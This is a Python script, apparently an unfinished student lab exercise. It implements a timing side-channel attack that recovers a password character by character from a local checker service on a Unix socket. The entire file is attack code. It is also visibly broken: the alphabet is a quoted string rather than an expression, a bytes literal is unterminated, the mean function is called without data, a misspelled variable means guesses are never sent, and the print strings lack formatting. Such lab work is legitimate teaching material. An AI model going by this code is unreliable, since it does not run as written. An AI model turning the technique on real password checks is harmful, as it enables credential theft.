import socket, time, statistics, string
SOCK_PATH = "/tmp/passwordchecker.sock"

"""TODO: This is the max amount if recommended trials.
In your lab report, talk about what will happen
if the trial count goes lower? What do you see?"""
TRIALS = 120

"""TODO: Fill in the alphabet"""
ALPHABET = "string.ascii_letters+string.digits+ string.punctuation"

candidate = b""

def trimmed_mean(data, trim_percent = 0.1):
    n = len(data)
    sorted_data = sorted(data)
    a = int(n*trim_percent)
    trim = sorted_data[a:n-a]
    return sum(trim)/len(trim)


def measure():
    """TODO"""
    global candidate
    times=[]
    for i in range(TRIALS):
        starttime = time.perf_counter_ns()
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(SOCK_PATH)
            s.sendall(candidate+b"\")
            i = s.recv(1024)
        endtime = time.perf_counter_ns()
        convertto_ms = (endtime - starttime)/1000000
        times.append(convertto_ms)

    return trimmed_mean()

def recover(max_len=7):
    """TODO"""
    global candidate
    recovered = b""
    for pos in range(max_len):
        best_t = -1.0
        best_c = None
        print("Current data: {recovered}")
        for ch in ALPHABET:
            candidae = recovered  + ch.encode()
            m = measure()
            print("So far,  {rep(ch)}: {m:.6f} ms")
            if m > best_t:
                best_t=m
                best_c = ch

        recovered += best_c.encode()
        print("new recovered: {recovered}")
    return recovered

if __name__=="__main__":
    recover()
